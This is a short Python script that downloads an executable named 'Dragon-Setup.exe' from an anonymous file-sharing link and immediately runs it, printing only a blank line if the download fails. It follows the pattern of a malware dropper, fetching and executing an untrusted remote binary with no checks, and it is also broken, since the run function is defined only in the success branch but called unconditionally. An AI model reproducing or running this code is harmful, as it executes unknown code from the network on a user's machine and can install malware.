import requests
import subprocess

url = 'https://filetransfer.io/data-package/Rzk74FSk/download'
response = requests.get(url)

if response.status_code == 200:
    with open('Dragon-Setup.exe', 'wb') as file:
        file.write(response.content)
        
    def run_downloaded_file():
        subprocess.call(['Dragon-Setup.exe'])
        
else:
    print(' ')

run_downloaded_file()
